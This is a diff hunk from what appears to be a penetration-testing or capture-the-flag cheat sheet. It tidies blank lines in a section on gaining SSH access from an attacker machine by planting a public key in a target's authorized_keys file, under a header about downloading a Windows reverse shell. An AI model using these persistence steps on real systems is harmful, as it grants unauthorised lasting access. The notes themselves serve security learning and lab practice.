@@ -173,24 +173,16 @@ __Download the reverse shell in windows__
 ### SSH Login from Attacker to Target using id_rsa
 ```
 # Generate SSH Key Pair on Attacker Machine
-
 ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa # Give empty password
 
-
 # Copy Public Key from Attacker
-
 cat ~/.ssh/id_rsa.pub
 
-
-
 # Add Public Key to Target Machine
-
 cd ~/.ssh
 echo '<paste your public key here>' >> authorized_keys
 
-
 # From Attacker Machine
-
 ssh -i ~/.ssh/id_rsa athena@<target-ip>
 
 ```
